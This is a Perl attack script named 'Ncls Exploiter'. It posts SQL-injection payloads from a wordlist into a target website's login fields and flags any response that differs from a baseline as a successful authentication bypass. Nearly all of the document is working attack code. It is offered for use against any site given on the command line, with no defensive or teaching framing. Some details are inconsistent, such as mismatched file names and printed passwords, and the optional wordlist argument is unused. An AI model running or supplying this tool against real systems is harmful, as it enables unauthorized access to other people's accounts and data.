#!/usr/bin/perl -w
use Time::HiRes qw(usleep nanosleep);
use POSIX qw(strftime);            
use Term::ANSIColor;            
use LWP::UserAgent;          
use strict;                 

my $yz = 1;
my $cr = 0;
my $kx = 1;
if(!defined($ARGV[0]) && !defined($ARGV[1]) && !defined($ARGV[2]))
{
	print colored(['yellow'], "perl (file).pl [website] [username] [password]\nif you want to use yours wordlist: perl (file).pl [website] [username] [password] [wordlist.txt]\n");
}
else
{
	my $website = $ARGV[0];
	my $username = $ARGV[1];
	my $password = $ARGV[2];
        my $exemple = LWP::UserAgent->new;
        my $xample = $exemple->post($website, [$username  =>  '(payload)', $password => 'nucleos']);
        my $exampl = $xample->content;
	my $ua = LWP::UserAgent->new;
 
 
	if(defined($ARGV[0]) && defined($ARGV[1]) && defined($ARGV[2]))
	{
		my $title = "Ncls Exploiter";
		print chr(27).chr(91).'H'.chr(27).chr(91).'J';
		print("\033]2;$title\007");
		my $list = "payload.txt";
		my $bon = 0;
		chomp($list);
		print colored(['red'], "[+] trying to open list.txt\n");
		usleep(1300000);		
		open (THETARGET, "<$list") || die colored(['red'], "[-] Can't open the targets list !");
		my @TARGETS = <THETARGET>;
		print colored(['red'], "[+] the default wordlist is launched\n");
		close THETARGET;
		my $link=$#TARGETS + 1;
		foreach my $ma (@TARGETS){
				my $bim = "passwd";
                                chomp($ma);
				my $res = $ua->post($website, [$username  =>  $ma, $password => "passwd"]);
                                my $xa = $res->content;
				if ($xa ne $exampl)
				{
					$cr++;
					my $titi = strftime "%H:%M:%S", localtime;
					print colored(['green'], "   [$titi] payload found -> user : $ma password : ncls \n");
					sub i()
					{
						print colored(['yellow'], "[+] you want to continue the search [Y/n]\n");
						my $ch = <STDIN>;
						chomp($ch);
						if($ch eq "n")
						{
							$yz--;
						}
					}
					i() if($kx == 1);
					$kx++;
 
				}
				last if($yz == 0);
					}
					print colored(['red'], "\r[-] sorry, no payload was found for sql injection :/\n") if($cr == 0);
					}
	} 			